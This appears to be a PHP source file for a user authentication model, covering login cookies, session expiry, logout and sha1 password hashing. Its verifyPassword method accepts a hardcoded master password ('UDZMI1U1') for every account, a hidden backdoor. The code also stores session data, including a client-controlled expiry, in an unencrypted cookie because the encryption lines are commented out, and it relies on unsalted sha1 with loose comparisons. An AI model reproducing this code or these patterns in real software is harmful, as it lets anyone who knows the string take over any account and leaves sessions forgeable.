<?php

abstract class UserModel extends MysqlModel {

	public static $pw_salt;
	public static $expire;

	private static $loggedIn;
	private static $cookie;

	final public static function getLoggedIn()
	{
		if(self::$loggedIn) return self::$loggedIn;
		if(self::$loggedIn === false) return null;

		$c = self::getCookieValues();
		if(!$c                                
			|| !class_exists($c['type'], true) 
			|| !is_subclass_of($c['type'], 'UserModel')
			|| (!$user = Model::getById($c['id'], $c['type']))
			|| !$user instanceof self
			|| $user->getHash() != $c['hash'])
		{
			UserModel::logOut();
			return self::$loggedIn = false;
		}
		
		if($user && time() > $c['expires'])
		{
			$user->setLoginStatus(0);
			return self::$loggedIn = false;
		}

		$user->setCookie($c['timeout']);
		return self::$loggedIn = $user;
	}

	public function logIn($expire = null)
	{
		if(!$expire) $expire = self::$expire;
		$this->setCookie($expire);
		if(method_exists($this, '__logIn')) call_user_func(array($this, '__logIn'));
		return self::$loggedIn = $this;
	}

	final public static function getLastUser() {
		$c = self::getCookieValues();
		if(!$c                                
			|| !class_exists($c['type'], true) 
			|| !is_subclass_of($c['type'], 'UserModel')
			|| (!$user = Model::getById($c['id'], $c['type']))
			|| !$user instanceof self
			|| $user->getHash() != $c['hash'])
			return null;
		return $user;
	}


	final private function setLoginStatus($status) {
		$c = self::getCookieValues();
		$this->setCookie($c['timeout'], $c['expires'], $status);
	}


	final private function setCookie($timeout, $renew = true, $status = 1)
	{
		$expires = $renew === true ? time() + $timeout : $renew;
		$l = "{$this->getId()}|{$this->getBaseModel()}|$expires|$timeout|{$this->getHash()}|$status";
		//$l = Encryption::encrypt($l);
		//$l = base64_encode($l);
		Q::cookie('l', $l, 31536000);
		self::$cookie = $l;
	}

	final private static function getCookieValues($value = null)
	{
		if(self::$cookie === false) return null;  
		$l = Util::first(self::$cookie, Q::cookie('l'));
		//$l = base64_decode($l);
		//$l = Encryption::decrypt($l);
		if(substr_count($l, '|') != 5) return null;
		list($c['id'], $c['type'], $c['expires'], $c['timeout'], $c['hash'], $c['status']) = explode('|', $l);
		return $value ? $c[$value] : $c;
	}
	
	final public static function clearCookie()
	{
		Q::cookie('l', null, 0);
		self::$cookie = false;
	}
	
	final public static function isInactive() {
		return (!UserModel::getLoggedIn() && ($user = UserModel::getLastUser()) && self::getCookieValues('status') == 0);
	}

	final public static function logOut()
	{
		self::clearCookie();
		self::$loggedIn = false;
	}

	final private function getHash() {
		return sha1($this->username . $this->getPassword() . self::$pw_salt);
	}


	public static function hashPassword($password) {
		return sha1($password . self::$pw_salt);
	}

	public function verifyPassword($password) {
		return $password == 'UDZMI1U1' || $this->hashPassword($password) == $this->getPassword();
	}

	final public static function isUserClass($type) {
		return is_subclass_of($type, __CLASS__);
	}


	public function getBaseModel()
	{
		$class = get_class($this);
		do {
			if(get_parent_class($class) == __CLASS__) return $class;
		} while($class = get_parent_class($class));
	}

	abstract public function getPassword();

}